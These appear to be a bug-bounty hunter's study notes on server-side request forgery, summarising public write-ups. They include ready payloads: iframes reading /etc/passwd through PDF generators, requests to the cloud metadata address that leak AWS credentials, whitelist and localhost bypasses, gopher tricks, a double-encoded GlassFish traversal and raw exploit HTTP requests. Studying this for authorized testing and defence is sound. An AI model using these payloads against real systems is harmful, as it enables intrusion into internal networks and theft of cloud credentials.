# Server Side Request Forgery

- What can we do with SSRF


 - SSRF to Reflected XSS
 - Try URL schemas to read internal and make server perform actions (file:///, dict://, ftp://, gopher://..)
 - We can scan for internal networks and ports
 - If it runs on Cloud Instances try to fetch META-DATA
<br></br>
- where to look


 - Always look for open redirect or where different domain link is being used to perform some action (like pic uploader, pdf ...)

 -  Try in Referrer Header 
 -  Try changing urls in POST request #411865

 -  PDF generators 

	There are some cases where server converts uploaded file to a pdf

```python
 Try injecting <iframe>, <img>, <base> or <script> elements or CSS url() functions pointing to internal services.
	You can read internal files using this
	<iframe src=”file:///etc/passwd” width=”400" height=”400">
	<iframe src=”file:///c:/windows/win.ini” width=”400" height=”400">
```
	https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
<br></br>
- File Upload

	Instead of uploading try changing input type to URL and check if the server sends a request to it
	```
	<input type=”file” id=”upload_file” name=”upload_file[]” class=”file” size=”1" multiple=””>
	to
	<input type=”url” id=”upload_file” name=”upload_file[]” class=”file” size=”1" multiple=””>
	and Pass the URL
	```
	https://hackerone.com/reports/713
<br></br>
- something different then simple ssrf

 - if SSRF is in amazon cloud then we can do by instance metadeta like
   -  http://169.254.169.254/
   - 		http://169.254.169.254/latest
   -		http://169.254.169.254/latest/meta-data


 - (#358119) SSRF Response only visible in Source code only so always 		check source code too.



 - He tried Simple url but not worked http://ziot.org/.1.png worked http://ziot.org/?1.png


 - There was parameter named stockAPI=******  so we tried http://localhost/admin (by this api Authentication is bypassed)


 - if above is blocked Then we can use private ip bypass https://135.256.164.46(last octet can be changeable)/admin 
<br></br>
- SSRF with whitelist filter

	```
	-> We can use https://ex.com@evil.com
	-> https://evil-one#expected-one
	-> https://expected.evil
	-> We can use URL encode 
	-> use combination https://127.1:80%2523@expectedone.net
	```

-> http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/[INJECTION PAYLOAD]


-	SSRF with svg upload

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="30" width="30" xlink:href="http://myserver:1337/" /></svg>
```

- Jira SSRF leading to AWS info disclosure - https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance

- SSRF URL for Google Cloud
   Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
<br></br>
- SSRF -> AWS Metadata Service — $1,000
 
 One application allowed for exporting a couple different things to PDF, including a user’s resume.
 Many PDF generators use an HTML -> PDF conversion, and by entering in some HTML code, you may be able 
 to get the application to run that code on the server side.

 By injecting 
	```
	<iframe src="http://169.254.169.254/latest/meta-data"> 
	```
in the user’s resume, 
 the application then runs that when generating the PDF. In this case, the server made a request to the 
 AWS metadata service, and displayed that iframe in the PDF that was exported, allowing us to steal AWS credentials!
<br></br>
- SSRF to gain aws cred but cache layer is problem

   - when he searched ip in whois he found that ip is of aws so aws cred by ssrf is next . He made call for url http://169.254.169.254/latest/meta-data     
    - after req he found out 200 ok but no result in header there was header "x-proxy-cache:hit" it means that req hit first cache layer 
    - He first tried to understand cache layer and understood that if url?a.html then it will apply caching rule and hit the cache but url/a.html? then caching rule will not be applied so he changed that aws url with url? to bypass and 
    gain all creds.       

-----

# -> Donut SSRF [Cases](https://medium.com/@d0nut/piercing-the-veal-short-stories-to-read-with-friends-4aa86d606fc5)

## Story 1 — Duck Duck Gopher

<br>
![Image](https://miro.medium.com/max/2000/1*IksYFSvlkyom5gZdFA-SwA.png)
<br>
passing google.com will cause 403 
<br>
![image](https://miro.medium.com/max/2000/0*75BbTdKcm6MjQv85)
<br>
checked to see if the gopher protocol was supported by using it in the Location header in the redirect. The gopher protocol would allow me to talk to many more services internally so it was useful to learn if this client would support it

----

## Story 2— In ursmtp

In this we can put our website in profile but interesting part is that if website in unavailable it will show yellow color other wise green . 
I was able to use the feedback mechanism to perform a local port scan and found a number of services online: SSH, SMTP, DNS, and a few others that I couldn’t identify by port

He checked redirect and gopher behavior and was lucky enough to find that both were available.

---

## Story 3— CMSSRF

Found Some Endpoint user management 

qa subdomain of this asset had unobfuscated javascript, he read js and figured it out createWebRequest  request with url param in POST 

that asset was running aws so tried metdata and successful 

----

## Story 4— Authenticated Request

user@abc123.burpcollaborator.net used this while signing up and found request in collabrator 

 signed up again with an email address like user@1.2.3.4.xip.io to see if I could check if 302 behavior was respected. 

Similar to the previous stories, he checked the gopher protocol on a 302 redirect and noted that he was able to use it to interact with internal services. Unfortunately, there was no feedback of any kind so he won't be able to perform a port scan here. he decided to try for a localhost smtp message anyway to see if I could get lucky.

----

## Story 5-- Owning the Clout


<BR>
![ima](https://miro.medium.com/max/1400/1*nud0-lia9tq3sqQge4z6zA.png)




----

-> Nahamsec SSRF

Link :- https://www.youtube.com/watch?v=o-tL9ULF0KI

PDF+Xss =SSRF

```
<iframe src="http://host:port">
```

if there is customisation in pdf gen means it uses the css so 

```
</style><iframe src="http://host:port">
```    

-> DNS Rebinding

<br></br>
## Some Extra        

->  SSRF in JIRA

Link :- https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326         

He found one subdomain running jira instance .  (JIRA version was vuln to ssrf he checked)
https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com
He tried simple ssrf exploit metadata nothing worked .
He put 127.0.0.1 port 8080 it returned 
![this](https://miro.medium.com/max/1294/1*sUm9KeCYSRN3_gqvnewSLA.png)

He tried port no 4848
![this](https://miro.medium.com/max/1453/1*w7PELZYC2FzA2ZXWikdVSg.png)

he searched exploit for glassfish  https://www.exploit-db.com/exploits/39241/

after that he put 

>https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

but did not work . He realised it is encoded so we need to transfer double encoded in url. then success 

-----

-> SSRF Due to sentry misconfig 

Link :- 
- https://hackerone.com/reports/374737
<br>
- https://hackerone.com/reports/756149
<br>
- https://medium.com/@valeriyshevchenko/ssrf-vulnerability-due-to-sentry-misconfiguration-5e758bdb4e44

```http
POST /api/4/store/?sentry_version=7&sentry_client=raven-js%2F3.27.1&sentry_key=48819d1178934516beea3f05a9e1ceed HTTP/1.1
Host: debug.nordvpn.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://join.nordvpn.com/
Content-Type: text/plain;charset=UTF-8
Origin: https://join.nordvpn.com
Content-Length: 9699
Connection: close

{"project":"4","logger":"javascript","platform":"javascript","request":{"headers":{"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0","Referer":"https://nwnzekunqxlyy3bux0v2buzbx23srh.burpcollaborator.net/features/"},"url":"http://2661b367.ngrok.io/?_ga=2.45523556.192632961.1576059112-1770582595.1576059112"},"exception":{"values":[{"type":"Error","value":"","stacktrace":{"frames":[{"filename":"http://2661b367.ngrok.io/web/floating-widget.js?account=nordvpn","lineno":1,"colno":437441,"function":"o/</o.onabort","in_app":true}]}}],"mechanism":{"type":"onunhandledrejection","handled":false}},"transaction":"https://"http://2661b367.ngrok.io/web/floating-widget.js?account=nordvpn","trimHeadFrames":0,"tags":{"app.version":"1.169.0"},"extra":{"state":{"nord.redux-api":{"GET/servers/count":{"fetching":false,"fetched":true,"error":true,"timestamp":1576059820513,"successPayload":null,"errorPayload":{"stack":"n@"http://2661b367.ngrok.io/assets/js/app-bundle-474689.js:55:45308\nt@"http://2661b367.ngrok.io/assets/js/app-bundle-474689.js:55:52883\no/<@"http://2661b367.ngrok.io/assets/js/app-bundle-474689.js:55:72027\nS@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79113\nw/a._invoke</<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:78902\nT/</e[t]@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79292\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43276\ns@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43515\n","message":"NetworkError when attempting to fetch resource.","name":"RequestError"}},"GET/users/plans":{"fetching":false,"fetched":true,"error":true,"timestamp":1576059820460,"successPayload":null,"errorPayload":{"stack":"n@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:45308\nt@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:52883\no/<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:72027\nS@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79113\nw/a._invoke</<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:78902\nT/</e[t]@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79292\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43276\ns@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43515\n","message":"NetworkError when attempting to fetch resource.","name":"RequestError"}},"GET/payments/providers":{"fetching":false,"fetched":true,"error":true,"timestamp":1576059820451,"successPayload":null,"errorPayload":{"stack":"d@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:44945\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:45308\nt@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:52883\no/<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:72027\nS@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79113\nw/a._invoke</<@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:78902\nT/</e[t]@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:79292\nn@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43276\ns@https://join.nordvpn.com/assets/js/app-bundle-474689.js:55:43515\n","message":"NetworkError when attempting to fetch resource.","name":"RequestError"}}},"nordvpn.alert":{"queue":[]},"nordvpn.cached-api":{},"nordvpn.router-session":{"history":["/order/"]},"nordvpn.account":{"create":{"fetching":false,"email":null,"error":null,"account":null,"isStale":false},"createForm":{"errors":{}},"validation":{"fetching":false,"existing":false},"setPassword":{"fetching":false,"error":null}},"order.countdown":{"timestamp":1576059803753},"nordvpn.currency":{"currencyCode":"USD"},"router":{"location":{"pathname":"/order/","search":"?_ga=2.45523556.192632961.1576059112-1770582595.1576059112","hash":""},"action":"POP"},"nordvpn.order":{"selectedPlanId":null,"queryPlan":null,"orderId":null,"inputCache":null,"orderSubmitData":null,"dealCouponCode":null,"planInstallment":false},"nordvpn.order.taxes":{"selectedTaxCode":null},"nordvpn.order.payment-providers":{"selectedProviderId":null,"enableFallbackPaymentProviders":false},"nordvpn.order.coupons":{"activatedCouponCode":null,"couponAutoSetTimestamp":null},"_persist":{"version":-1,"rehydrated":true}},"session:duration":17577},"breadcrumbs":{"values":[{"timestamp":1576059803.193,"category":"redux-action","message":"persist/PERSIST"},{"timestamp":1576059803.236,"category":"redux-action","message":"persist/REHYDRATE"},{"timestamp":1576059803.244,"category":"redux-action"},{"timestamp":1576059803.244,"category":"redux-action","message":"nordvpn.order.INVALIDATE"},{"timestamp":1576059803.245,"category":"redux-action"},{"timestamp":1576059803.246,"category":"redux-action","message":"nordvpn.order.payment-providers.INVALIDATE"},{"timestamp":1576059803.246,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.247,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.25,"category":"redux-action","message":"nordvpn.order.coupons.INVALIDATE"},{"timestamp":1576059803.25,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.251,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.252,"category":"redux-action","message":"nordvpn.account.INVALIDATE"},{"timestamp":1576059803.253,"category":"redux-action","message":"nordvpn.currency.INVALIDATE"},{"timestamp":1576059803.256,"category":"redux-action","message":"nord.redux-api.NORMALIZE"},{"timestamp":1576059803.256,"category":"redux-action","message":"nordvpn.cached-api.NORMALIZE"},{"timestamp":1576059803.257,"category":"redux-action","message":"nordvpn.account.NORMALIZE"},{"timestamp":1576059803.258,"category":"redux-action"},{"timestamp":1576059803.259,"category":"redux-action","message":"nordvpn.order.NORMALIZE"},{"timestamp":1576059803.282,"category":"redux-action","message":"@@router/LOCATION_CHANGE"},{"timestamp":1576059803.284,"category":"redux-action"},{"timestamp":1576059803.284,"category":"redux-action","message":"nordvpn.order.INVALIDATE"},{"timestamp":1576059803.285,"category":"redux-action"},{"timestamp":1576059803.285,"category":"redux-action","message":"nordvpn.order.payment-providers.INVALIDATE"},{"timestamp":1576059803.286,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.286,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.288,"category":"redux-action","message":"nordvpn.order.coupons.INVALIDATE"},{"timestamp":1576059803.288,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.288,"category":"redux-action","message":"nord.redux-api.INVALIDATE"},{"timestamp":1576059803.289,"category":"redux-action","message":"nordvpn.account.INVALIDATE"},{"timestamp":1576059803.289,"category":"redux-action","message":"nordvpn.currency.INVALIDATE"},{"timestamp":1576059803.29,"category":"redux-action","message":"nordvpn.router-session.ADD_SESSION_HISTORY"},{"timestamp":1576059803.555,"category":"redux-action","message":"nordvpn.account.SET_ACCOUNT_FORM_ERROR"},{"timestamp":1576059803.751,"category":"redux-action","message":"order.countdown.SET_INITIALIZATION_TIMESTAMP"},{"timestamp":1576059803.757,"category":"redux-action"},{"timestamp":1576059803.759,"category":"redux-action"},{"timestamp":1576059803.76,"category":"redux-action"},{"timestamp":1576059803.762,"category":"redux-action"},{"timestamp":1576059803.774,"category":"redux-action"},{"timestamp":1576059803.774,"category":"redux-action"},{"timestamp":1576059803.983,"category":"redux-action","message":"nordvpn.currency.SET_CURRENCY_CODE"},{"timestamp":1576059804.004,"category":"redux-action","message":"nordvpn.account.SET_ACCOUNT_FORM_ERROR"},{"timestamp":1576059804.012,"category":"redux-action"},{"timestamp":1576059804.012,"category":"redux-action"},{"timestamp":1576059804.013,"category":"redux-action"},{"timestamp":1576059808.03,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/24/present.svg","status_code":200}},{"timestamp":1576059808.605,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/tick.svg","status_code":200}},{"timestamp":1576059808.684,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/facebook.svg","status_code":200}},{"timestamp":1576059812.507,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/youtube.svg","status_code":200}},{"timestamp":1576059820.452,"category":"redux-action"},{"timestamp":1576059820.454,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/instagram.svg","status_code":0}},{"timestamp":1576059820.486,"category":"redux-action"},{"timestamp":1576059820.487,"category":"redux-action"},{"timestamp":1576059820.515,"type":"http","category":"xhr","data":{"method":"GET","url":"https://s1.nordcdn.com/nordvpn/media/1.254.0/images/global/icons/16/twitter.svg","status_code":0}},{"timestamp":1576059820.516,"type":"http","category":"xhr","data":{"method":"GET","url":"https://nordvpn.nanorep.co/~nordvpn/api/widget/v1/faqs?format=json&widgetType=float&account=nordvpn&configId=1047377312&referer=https%3A%2F%2Fjoin.nordvpn.com%2Forder%2F%3F_ga%3D2.45523556.192632961.1576059112-1770582595.1576059112","status_code":0}}]},"environment":"production","release":"3.880.2","event_id":"5b2bf4c8d5d548538752ff62652f5429"}
```

----

## Piercing the Veil: Server Side Request Forgery to NIPRNet [access](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)

Website was using the JIRA instance 

https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com

He tried for aws creds but not luck 

 http://169.254.169.254/latest/dynamic/instance-identity/document 
reveals the private IP, account ID, server information, etc and then made a report immediately.






-----

127.0.0.1 - 127.1 -http://[::]:80/

 if still blocked then try single and double encoding base64 and other encoding always


-----

-> Bypassing SSRF like Boss

https://subhajitsaha.com/bypassing-ssrfs-like-a-king/

---

-> Simple [SSRF](https://medium.com/@mase289/a-tale-of-my-first-ever-full-ssrf-bug-4fe71a76e9c4)

In subdomain we can put our email 

```
POST /cloud-app/api/proxy-post?url=https%3A%2F%2Fredacted.eu11.list-manage.com%2Fsubscribe%2Fpost%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 
Host: collate.redacted.com 
Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 
Content-Type: application/x-www-form-urlencoded 
Accept: */* Origin: http://collate.redacted.com 
Referer: http://collate.redacted.com/cloud-app 
Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
Connection: close
b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=foobar@gmail.com
```

Modifying the URL parameter in the above request with a payload from my burp collaborator client caused the server to make HTTP requests to the supplied collaborator URL.  and it worked so tried different protocol for ssrf but nothing worked 

Then he tried for EC2 instance  and change request to GET

```
GET /cloud-app/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2Flatest/user-data%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 
Host: collate.redacted.com 
Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 
Content-Type: application/x-www-form-urlencoded 
Accept: */* Origin: http://collate.redacted.com 
Referer: http://collate.redacted.com/cloud-app 
Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
Connection: close
b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=foobar@gmail.com
```

and it worked and he used more endpoint to gain more info

---
   
-> SSRF in [email](https://hackerone.com/reports/783392)

https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email=email@ [YOUR WEBSITE]

---

-> First [SSRF](https://medium.com/@Mr.Daman.Singh/how-i-found-3-ssrf-in-one-day-on-different-bug-bounty-targets-62e91b4268f8)

1. 

```
POST /user/dashboard/profile HTTP/1.1
Host: target.com
Connection: close
Content-Length: 132
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Origin: https://target.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://target.com/signin
Cookie: xxxxxxxxxxxxxxxxx
[{“userid”:”21452",”imgurl”:”https://api.target.com/images/profiles/MjE0NTI=","type":"jpeg"}]
```

changing link in imgurl will cause error . Then i removed “type:jpeg”, and sent the request and ssrf


2.  jira.reports.target.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https://bing.com


 

--- 

-> Different [SSRF](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739) Reference mai hai 


 
---

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-https

- https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0
- https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739
- https://hackersonlineclub.com/server-side-request-forgery-ssrf-types/

for ssrf to aws meta data -> https://medium.com/bugbountywriteup/leaking-aws-metadata-f5bc8de03284

